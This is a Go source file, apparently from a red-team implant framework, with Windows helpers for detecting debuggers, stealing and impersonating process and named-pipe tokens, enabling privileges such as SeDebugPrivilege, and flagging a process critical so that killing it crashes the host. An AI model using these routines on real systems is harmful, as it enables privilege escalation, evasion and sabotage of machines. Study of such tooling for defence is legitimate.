//go:build windows
// +build windows

package device

import (
	"os"
	"strings"
	"unsafe"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/device/winapi"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
	"golang.org/x/net/http/httpproxy"
)

type privileges struct {
	PrivilegeCount uint32
	Privileges     [5]winapi.LUIDAndAttributes
}

// IsDebugged returns true if the current process is attached by a debugger.
func IsDebugged() bool {
	if winapi.IsDebuggerPresent() {
		return true
	}
	h, err := winapi.OpenProcess(0x400, false, winapi.GetCurrentProcessID())
	if err != nil {
		return false
	}
	var d bool
	err = winapi.CheckRemoteDebuggerPresent(h, &d)
	winapi.CloseHandle(h)
	return err == nil && d
}

// RevertToSelf function terminates the impersonation of a client application.
// Returns an error if no impersonation is being done.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func RevertToSelf() error {
	return forEachThread(func(t uintptr) error { return winapi.SetThreadToken(&t, 0) })
}
func split(s string) []string {
	if len(s) == 0 {
		return nil
	}
	if len(s) == 1 {
		return []string{s}
	}
	var (
		r []string
		x int
	)
	for i := 1; i < len(s); i++ {
		if s[i] != ';' && s[i] != ' ' {
			continue
		}
		if x == i {
			continue
		}
		for ; x < i && (s[x] == ';' || s[x] == ' '); x++ {
		}
		if x == i {
			continue
		}
		r = append(r, s[x:i])
		if x = i + 1; x > len(s) {
			break
		}
		for ; x < len(s) && (s[x] == ';' || s[x] == ' '); x++ {
		}
		i = x
	}
	if x == 0 && len(r) == 0 {
		return []string{s}
	}
	if x < len(s) {
		r = append(r, s[x:])
	}
	return r
}

// SetCritical will set the critical flag on the current process. This function
// requires administrative privileges and will attempt to get the
// "SeDebugPrivilege" first before running.
//
// If successful, "critical" processes will BSOD the host when killed or will
// be prevented from running.
//
// Use this function with "false" to disable the critical flag.
//
// NOTE: THIS MUST BE DISABED ON PROCESS EXIT OTHERWISE THE HOST WILL BSOD!!!
//
// Any errors when setting or obtaining privileges will be returned.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func SetCritical(c bool) error {
	if err := winapi.GetDebugPrivilege(); err != nil {
		return err
	}
	return winapi.RtlSetProcessIsCritical(c)
}

// Mounts attempts to get the mount points on the local device.
//
// On Windows devices, this is the drive letters avaliable, otherwise on nix*
// systems, this will be the mount points on the system.
//
// The return result (if no errors occurred) will be a string list of all the
// mount points (or Windows drive letters).
func Mounts() ([]string, error) {
	d, err := winapi.GetLogicalDrives()
	if err != nil {
		return nil, xerr.Wrap("GetLogicalDrives", err)
	}
	m := make([]string, 0, 26)
	for i := 0; i < 26; i++ {
		if (d & (1 << i)) == 0 {
			continue
		}
		m = append(m, string(rune('A'+i))+":\\")
	}
	return m, nil
}
func proxyInit() *httpproxy.Config {
	var (
		i   winapi.ProxyInfo
		err = winapi.WinHTTPGetDefaultProxyConfiguration(&i)
	)
	if err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("device.proxyInit(): Retriving proxy info failed, falling back to no proxy: %s", err)
		}
		return nil
	}
	if i.AccessType < 3 || (i.Proxy == nil && i.ProxyBypass == nil) {
		return nil
	}
	var (
		v = winapi.UTF16PtrToString(i.Proxy)
		b = winapi.UTF16PtrToString(i.ProxyBypass)
	)
	if len(v) == 0 && len(b) == 0 {
		return nil
	}
	var c httpproxy.Config
	if i := split(b); len(i) > 0 {
		c.NoProxy = strings.Join(i, ",")
	}
	for _, x := range split(v) {
		if len(x) == 0 {
			continue
		}
		q := strings.IndexByte(x, '=')
		if q > 3 {
			if (x[0] != 'h' && x[0] != 'H') || (x[1] != 't' && x[1] != 'T') || (x[2] != 't' && x[2] != 'T') || (x[3] != 'p' && x[3] != 'P') {
				continue
			}
			if q == 4 {
				c.HTTPProxy = x[q+1:]
			}
			if x[4] != 's' && x[4] != 'S' {
				continue
			}
			if q > 5 {
				continue
			}
			c.HTTPSProxy = x[q+1:]
			continue
		}
		if len(c.HTTPProxy) == 0 {
			c.HTTPProxy = x
		}
		if len(c.HTTPSProxy) == 0 {
			c.HTTPSProxy = x
		}
	}
	if bugtrack.Enabled {
		bugtrack.Track(
			"devtools.proxyInit(): Proxy info c.HTTPProxy=%s, c.HTTPSProxy=%s, c.NoProxy=%s",
			c.HTTPProxy, c.HTTPSProxy, c.NoProxy,
		)
	}
	return &c
}

// Impersonate attempts to steal the Token in use by the target process of the
// supplied filter.
//
// This will set the permissions of all threads in use by the runtime. Once work
// has completed, it is recommended to call the 'RevertToSelf' function to
// revert the token changes.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func Impersonate(f *filter.Filter) error {
	if f.Empty() {
		return filter.ErrNoProcessFound
	}
	x, err := f.TokenFunc(0xE, nil)
	if err != nil {
		return err
	}
	var y uintptr
	err = winapi.DuplicateTokenEx(x, 0x2000000, nil, 2, 2, &y)
	if winapi.CloseHandle(x); err != nil {
		return err
	}
	err = forEachThread(func(t uintptr) error { return winapi.SetThreadToken(&t, y) })
	winapi.CloseHandle(y)
	return err
}

// AdjustPrivileges will attempt to enable the supplied Windows privilege values
// on the current process's Token.
//
// Errors during encoding, lookup or assignment will be returned and not all
// privileges will be assigned, if they occur.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func AdjustPrivileges(s ...string) error {
	if len(s) == 0 {
		return nil
	}
	var (
		t   uintptr
		err = winapi.OpenProcessToken(winapi.CurrentProcess, 0x200E8, &t)
	)
	if err != nil {
		return xerr.Wrap("OpenProcessToken", err)
	}
	err = AdjustTokenPrivileges(t, s...)
	winapi.CloseHandle(t)
	return err
}
func adjust(h uintptr, s []string) error {
	var (
		p   privileges
		err error
	)
	for i := range s {
		if i > 5 {
			break
		}
		if err = winapi.LookupPrivilegeValue("", s[i], &p.Privileges[i].Luid); err != nil {
			if xerr.Concat {
				return xerr.Wrap(`cannot lookup "`+s[i]+`"`, err)
			}
			return xerr.Wrap("cannot lookup privilege", err)
		}
		p.Privileges[i].Attributes = 0x2
	}
	p.PrivilegeCount = uint32(len(s))
	if err = winapi.AdjustTokenPrivileges(h, false, unsafe.Pointer(&p), uint32(unsafe.Sizeof(p)), nil, nil); err != nil {
		return xerr.Wrap("cannot assign all privileges", err)
	}
	return nil
}

// ImpersonatePipeToken will attempt to impersonate the Token used by the Named
// Pipe client.
//
// This function is only usable on Windows with a Server Pipe handle.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func ImpersonatePipeToken(h uintptr) error {
	return winapi.ImpersonateNamedPipeClient(h)
}
func forEachThread(f func(uintptr) error) error {
	h, err := winapi.CreateToolhelp32Snapshot(0x4, 0)
	if err != nil {
		return xerr.Wrap("CreateToolhelp32Snapshot", err)
	}
	var (
		p = uint32(os.Getpid())
		t winapi.ThreadEntry32
		v uintptr
	)
	t.Size = uint32(unsafe.Sizeof(t))
	for err = winapi.Thread32First(h, &t); err == nil; err = winapi.Thread32Next(h, &t) {
		if t.OwnerProcessID != p {
			continue
		}
		if v, err = winapi.OpenThread(0xE0, false, t.ThreadID); err != nil {
			break
		}
		err = f(v)
		if winapi.CloseHandle(v); err != nil {
			break
		}
	}
	if winapi.CloseHandle(h); err == winapi.ErrNoMoreFiles {
		return nil
	}
	return err
}

// AdjustTokenPrivileges will attempt to enable the supplied Windows privilege
// values on the supplied process Token.
//
// Errors during encoding, lookup or assignment will be returned and not all
// privileges will be assigned, if they occur.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func AdjustTokenPrivileges(h uintptr, s ...string) error {
	if len(s) == 0 {
		return nil
	}
	if len(s) <= 5 {
		return adjust(h, s)
	}
	for x, w := 0, 0; x < len(s); {
		if w = 5; x+w > len(s) {
			w = len(s) - x
		}
		if err := adjust(h, s[x:x+w]); err != nil {
			return err
		}
		x += w
	}
	return nil
}
